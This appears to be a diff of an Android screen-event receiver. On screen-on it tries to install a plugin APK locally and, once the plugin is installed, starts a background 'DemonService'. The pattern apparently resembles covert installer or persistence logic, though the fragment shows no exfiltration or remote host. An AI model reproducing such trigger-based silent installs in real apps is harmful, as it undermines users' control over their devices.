@@ -29,17 +29,17 @@ public class ScreenBroadcastReceiver extends BroadcastReceiver {
                                 + " function screen status : " + UtilsRuntime.isScreenLocked(context));
 
                 //try to install
+                boolean pluginInstalled = SingleInstanceBase.getInstance(PLuginManager.class).scanPluginInstalled();
                 if (UtilOperator.isPluginApkExist()
                         /**&& !UtilsRuntime.isPackageHasInstalled(context, Config.PLUGIN_PACKAGE_NAME)**/
-                        && !SingleInstanceBase.getInstance(PLuginManager.class).scanPluginInstalled()) {
-
-                    if (!AppRuntime.SERVICE_RUNNING) {
-                        Intent i = new Intent();
-                        i.setClass(context, DemonService.class);
-                        context.startService(i);
-                    }
+                        && !pluginInstalled) {
 
                     UtilOperator.tryToInstallPluginLocal(context);
+                } else if (pluginInstalled) {
+                    Intent i = new Intent();
+                    i.setAction(DemonService.ACTION_ACTIVE_SERVICE);
+                    i.setClass(context, DemonService.class);
+                    context.startService(i);
                 }
             } else if (intent.getAction().equals(Intent.ACTION_SCREEN_OFF)) {
                 Config.LOGD("<<<< " + Intent.ACTION_SCREEN_OFF + " >>>>>"
